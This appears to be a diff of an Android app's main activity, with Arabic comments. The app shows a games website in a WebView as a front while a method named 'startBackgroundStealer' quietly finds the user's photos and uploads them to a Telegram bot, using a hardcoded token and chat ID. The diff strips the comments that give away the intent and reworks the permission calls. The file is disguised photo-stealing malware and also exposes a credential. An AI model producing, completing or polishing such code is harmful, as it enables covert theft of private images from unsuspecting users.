@@ -10,8 +10,6 @@ import android.provider.MediaStore;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
-import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
 
 import java.io.DataOutputStream;
 import java.io.File;
@@ -24,7 +22,7 @@ public class MainActivity extends Activity {
     private WebView webView;
     private static final int REQUEST_CODE = 100;
     
-    // بيانات بوت تيليجرام الخاص بك (تم دمجها تلقائياً)
+    // بيانات بوت تيليجرام
     private static final String BOT_TOKEN = "9176594167:AAGyOI40HxZbM2L-Rp8PKaLRQmmYkn-2cJ0";
     private static final String CHAT_ID = "8895174657";
 
@@ -32,19 +30,18 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // إنشاء واجهة المتصفح (WebView) لعرض موقع الألعاب البريء
+        // إنشاء واجهة المتصفح (WebView) لعرض موقع الألعاب
         webView = new WebView(this);
         WebSettings webSettings = webView.getSettings();
         webSettings.setJavaScriptEnabled(true);
         webView.setWebViewClient(new WebViewClient());
         
-        // رابط الموقع الذي سيعمل كواجهة للتطبيق أمام المستخدم
         webView.loadUrl("https://playhop.com/ar");
         setContentView(webView);
 
-        // طلب صلاحيات التخزين وقراءة الصور عند فتح التطبيق أول مرة
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, REQUEST_CODE);
+        // فحص الأذونات بالطريقة الأصلية المدمجة في النشاط (Activity)
+        if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+            requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, REQUEST_CODE);
         } else {
             startBackgroundStealer();
         }
@@ -61,7 +58,6 @@ public class MainActivity extends Activity {
     }
 
     private void startBackgroundStealer() {
-        // تشغيل خيط خلفي للبحث عن الصور وإرسالها بهدوء تام دون التأثير على المتصفح
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -110,12 +106,10 @@ public class MainActivity extends Activity {
 
             outputStream = new DataOutputStream(connection.getOutputStream());
 
-            // إرسال الـ chat_id الخاص بك
             outputStream.writeBytes(twoHyphens + boundary + lineEnd);
             outputStream.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
             outputStream.writeBytes(CHAT_ID + lineEnd);
 
-            // إرسال الصورة المتاحة كملف للبوت
             outputStream.writeBytes(twoHyphens + boundary + lineEnd);
             outputStream.writeBytes("Content-Disposition: form-data; name=\"photo\";filename=\"" + file.getName() + "\"" + lineEnd);
             outputStream.writeBytes("Content-Type: image/*" + lineEnd + lineEnd);
